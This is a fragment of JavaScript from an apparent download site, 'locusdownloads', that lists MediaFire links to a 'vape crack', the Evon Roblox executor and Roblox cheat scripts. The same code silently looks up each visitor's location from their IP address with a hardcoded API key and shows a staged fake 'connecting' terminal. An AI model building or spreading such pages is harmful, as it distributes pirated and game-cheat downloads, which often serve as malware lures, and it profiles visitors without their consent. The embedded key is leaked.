...
(function () {
    ...
    $(document).ready(function () {
        var links = [
		    ...
		    {
                name: 'vape crack',
                link: 'https://www.mediafire.com/file/gs2f3tt6yk7wjxd/vapecrack.rar/file'
            },
		    {
                name: 'evon roblox',
                link: 'https://www.mediafire.com/file/6udode924hi7h7h/Evon.rar/file'
            },
		    {
                name: 'vape script roblox',
                link: 'https://www.mediafire.com/file/wdz3vw384g9l8d7/VapeV4.lua/file'
            },
            {
                name: 'rise script roblox',
                link: 'https://www.mediafire.com/file/wd9wa5xdx0a1jre/rise.lua/file'
            },
        ]; 
        for (var i in links) {
            var link = links[i];
    ...
    (function () {
        $.getJSON('https://api.ipgeolocation.io/ipgeo?apiKey=2bdc619693544329841a3196dca3f6c0', function (data) { 
            ...
            writeLine(["Starting... Intializing.", "Trying to connect to <span style='font-size: 14px; color: #7F00FF;'>[locusdownloads]</span>..."], 30, function () {
